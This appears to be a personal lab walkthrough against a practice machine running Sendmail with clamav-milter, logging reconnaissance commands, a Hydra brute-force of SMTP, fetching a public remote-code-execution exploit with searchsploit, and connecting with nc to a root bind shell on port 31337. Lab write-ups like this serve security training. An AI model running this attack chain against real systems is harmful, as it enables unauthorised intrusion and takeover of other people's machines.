# NMAP

```
sudo nmap -sC -sV 192.168.247.42  -oN nmap-clamav
```

![[PG/Linux/attachments/Pasted image 20250704122033.png]]
- 445 is open.. 
- smux?


All ports

![[PG/Linux/attachments/Pasted image 20250704122141.png]]
- what's 60,000?

```
sudo nmap -p 60000 -sV -sC 192.168.247.42 -oN nmap-60000
```

![[PG/Linux/attachments/Pasted image 20250704122728.png]]
- openssh
# Website 

![[PG/Linux/attachments/Pasted image 20250704122354.png]]

## Gobust

```
gobuster dir -u http://192.168.247.42/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -o gobust.out
```

Jokezzz
![[PG/Linux/attachments/Pasted image 20250704122632.png]]

![[PG/Linux/attachments/Pasted image 20250704122654.png]]
- nothing from gobuster

# SMB 

```
nxc smb 192.168.247.42 -u 'admin' -p 'admin' --shares
```


![[PG/Linux/attachments/Pasted image 20250704122842.png]]
- print$ share
- smbd 3.0.14a-Debian 
- no immediate exploits for this 

## smbclient 

```
smbclient -U root -L //192.168.247.42/print$
```
- nope

```
smbclient -U postmaster -L //192.168.247.42/print$
```
# SMTP

Sendmail 8.13.4/8.13.4/Debian-3sarge3

Connection test 

```
telnet 192.168.247.42 25
```

![[PG/Linux/attachments/Pasted image 20250704124036.png]]
- root exists

Enum usernames and save to a file..

```
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.247.42
```

Testing this binary as a password, but nothing promising with nxc ifyoudontpwnmeuran00b

![[PG/Linux/attachments/Pasted image 20250704124923.png]]

Maybe will try enum4linux 

# Enum4linux

Enum usernames
```
enum4linux -U 192.168.247.42
```

![[PG/Linux/attachments/Pasted image 20250704125649.png]]

# Linux SNMP multiplexer

```
snmp-check 192.168.247.42 -c public
```

# Hydra

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smtp://192.168.247.42
```
- fail

# Lookup ClamAV on searchsploit...

Sendmail with clamav-milter < 0.91.2 -Remote Code Execution Exploit

```
searchsploit -m multiple/remote/4761.pl
```

![[PG/Linux/attachments/Pasted image 20250704140754.png]]

This opens port 31337?

```
nmap -p 31337 192.168.247.42
```

![[PG/Linux/attachments/Pasted image 20250704140936.png]]

Grab root shell with 
```
nc 192.168.247.42 31337
```

allegedly..

![[PG/Linux/attachments/Pasted image 20250704141327.png]]

stupid.